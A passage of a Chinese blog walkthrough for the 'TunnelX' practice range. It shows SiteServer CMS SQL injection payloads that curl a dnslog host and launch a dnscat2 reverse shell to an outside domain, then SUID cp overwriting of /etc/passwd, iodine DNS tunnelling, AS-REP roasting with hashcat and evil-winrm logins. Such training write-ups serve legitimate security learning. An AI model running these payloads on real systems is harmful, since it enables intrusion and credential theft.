@@ -1,0 +1,292 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>TunnelX - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">TunnelX</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>fscan nmap扫描到2121的ftp端口</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114141603.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114141603.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>链接上去下载secrets.7z</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ftp 39.99.238.69 <span class="m">2121</span>
+</span></span><span class="line"><span class="cl">anonymous
+</span></span><span class="line"><span class="cl">dir
+</span></span><span class="line"><span class="cl">get secret.7z
+</span></span></code></pre></div></div><p>需要密码,先把他转换为john格式,再去爆破密码</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">7z2john secret.7z &gt;1.txt
+</span></span><span class="line"><span class="cl">john 1.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">7z x secret.7z
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114141915.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114141915.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>13131313是密码</p>
+<p>然后去解密得到</p>
+<p>e7d41890-5742-48f0-9f3c-1393db541fc7</p>
+<p>这不是flag这是SiteServer CMS的API密钥</p>
+<p>同时目录扫描发现一个/version.txt访问得到漏洞版本6.15.51</p>
+<p>SiteServer CMS提供了使用Header的API认证方式代替账号密码登录，因此，我们拥有了API之后，可以直接调用后台的接口进而造成SQL注入</p>
+<p>先注入脚本</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="c1">##观感太差我放子文件夹里去了</span>
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/pages/cms/libraryText/list</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">39.99.238.209</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-SS-API-KEY</span><span class="o">:</span> <span class="l">e7d41890-5742-48f0-9f3c-1393db541fc7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;siteId&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;keyword&#34;</span><span class="p">:</span><span class="s2">&#34;&#39;;select sys_eval(&#39;curl `whoami`.xwqn3w.dnslog.cn&#39;)-- &#34;</span><span class="p">,</span><span class="nt">&#34;groupId&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;page&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;perPage&#34;</span><span class="p">:</span><span class="mi">24</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>先配置</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114150340.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114150340.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb ns1.desein.xyz -c datou</code></p>
+<p><code>sudo systemctl start systemd-resolved</code></p>
+<p>这样就可以反弹shell了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/pages/cms/libraryText/list</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">39.98.120.33</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-SS-API-KEY</span><span class="o">:</span> <span class="l">e7d41890-5742-48f0-9f3c-1393db541fc7</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">126</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;siteId&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;keyword&#34;</span><span class="p">:</span><span class="s2">&#34;&#39;;select sys_eval(&#39;/tmp/dnscat --secret=datou ns1.desein.xyz&#39;)-- &#34;</span><span class="p">,</span><span class="nt">&#34;groupId&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;page&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;perPage&#34;</span><span class="p">:</span><span class="mi">24</span><span class="p">}</span>
+</span></span></code></pre></div></div><p>连上了之后使用</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">windows
+</span></span><span class="line"><span class="cl">window -i 1
+</span></span><span class="line"><span class="cl">shell
+</span></span><span class="line"><span class="cl">window -i 2
+</span></span></code></pre></div></div><p>成功进入到shell</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>提权</p>
+<p>发现cp有suid权限</p>
+<p>写入一个passwd文件用cp覆盖掉</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">openssl passwd -6 -salt <span class="m">1</span> <span class="m">123456</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># $6$1$j.74UuJkzzPKyD/cMaD1PygML3gwSnec87gsickCF6sO5D8UuHzTbK0DtUbI1257QK03GEHXpdFFmjPewVtaI0</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>脚本写进去后直接</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">cp /tmp/passwd1 /etc/passwd
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#用python获得可交互式终端,同时刷新</span>
+</span></span><span class="line"><span class="cl">su root
+</span></span><span class="line"><span class="cl"><span class="m">123456</span>
+</span></span></code></pre></div></div><p>拿到flag后用iodine进行dns代理</p>
+<p>使用大头的脚本</p>
+<p>目标服务器上权限</p>
+<p>只有一台服务器的话可以让他sleep再开,但是有两台就无所谓了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">chmod +x /tmp/iodine
+</span></span><span class="line"><span class="cl">nohup sleep 10 &amp;&amp; /tmp/iodine -f -P datou ns1.desein.xyz &amp;
+</span></span></code></pre></div></div><p>另外开一台vps</p>
+<p><code>iodined -f -c -P datou 192.168.0.1 ns1.desein.xyz -DD</code></p>
+<p>(实际上还是用的他的办法)</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114160231.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114160231.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>这样就ssh上去了,可以挂代理了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">sh</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="sh"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ssh -N -D <span class="m">29999</span> root@192.168.0.2
+</span></span></code></pre></div></div><p>创建一个socks代理</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">[common]
+</span></span><span class="line"><span class="cl">server_addr = 1.1.1.1
+</span></span><span class="line"><span class="cl">server_port = 7000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[yj]
+</span></span><span class="line"><span class="cl">type = tcp
+</span></span><span class="line"><span class="cl">local_ip = 127.0.0.1
+</span></span><span class="line"><span class="cl">local_port = 29999
+</span></span><span class="line"><span class="cl">remote_port = 7001
+</span></span></code></pre></div></div><p><code>netstat -nap | grep 6666</code>
+也可以ssh代理
+<code>sudo ssh -C -f -N -g -L 0.0.0.0:7001:127.0.0.1:29999 root@165.154.5.221 -p2222</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170614.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170614.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div>蕾姆了</p>
+<p>然后传fscan扫描</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170652.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170652.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>这里DC的ldap服务可以匿名访问，能查询所有域用户</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains ldapsearch -H ldap://172.22.61.17 -b &#34;DC=xiaorang,DC=lab&#34; -x|grep &#39;,CN=Users,DC=xiaorang,DC=lab&#39;
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> config file found: /etc/proxychains4.conf
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> DLL init: proxychains-ng 4.16
+</span></span><span class="line"><span class="cl"><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  165.154.5.221:7001  ...  172.22.61.17:389  ...  OK
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Guest,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Guest,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>DefaultAccount,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>krbtgt,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Computers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Schema Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Cert Publishers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Domain Guests,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>RAS and IAS Servers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Allowed RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Denied RODC Password Replication Group,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Read-only Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Cloneable Domain Controllers,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Protected Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>Protected Users,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Key Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Enterprise Key Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>DnsAdmins,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>DnsUpdateProxy,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>wangmei,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>wangmei,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>zhangjing,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>wangyong,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>huangyong,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>lixiang,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>chenlei,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>chenlei,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>yangjie,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>yangjie,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>zhangjun,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>yangdming,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>zhangmei,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>wangrong,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>zhangpeng,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>liuyun,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">CN</span><span class="o">=</span>liuyun,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">dn: <span class="nv">CN</span><span class="o">=</span>Shutdown_group,CN<span class="o">=</span>Users,DC<span class="o">=</span>xiaorang,DC<span class="o">=</span>lab
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>跑一下AS-REP Roasting</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 GetNPUsers.py -dc-ip 172.22.61.17 -usersfile ~/Desktop/user.txt xiaorang.lab/ 
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">yangdming:kier@n10
+</span></span></code></pre></div></div><div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">hashcat -m 18200 &#39;$krb5asrep$23$yangdming@XIAORANG.LAB:324cd949cb813b90b13219cfc6bbbd6e$1b4b3d2bc2c3d754e74e425e18c759c35a27a12341d4e41bd40248d60b4c5c064dcc2ecd7e17571022465b61db5fa98c7826a4fe8e132bb895c48fbcdcd8f011c97ee741d716ca1401ba24a3fd01d72d95071d447a1def6d8cebb9e57108fa3ac2f235b86b281a198e84518fa06b0c3c8d0a8c51a025693ee5e8a23f7757499daf2a336bf26acb952bf814f891c435799221124c94d68a78c44e632eb1a8a6ab599e456cc037f89dee504cf56dcc1d8bef6f619cc7a3172be4d13430873588028dd547e3026ef229e4b545c825f14583baa7c2f0b94e6304a01021bb6fd5173cb2213060727b3e97c533277e&#39; /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></div></div><p>接着可以用evil-winrm连上去</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains evil-winrm -i 172.22.61.34 -u yangdming -p kier@n10
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170947.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240114170947.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>跑一下bloodhound</p>
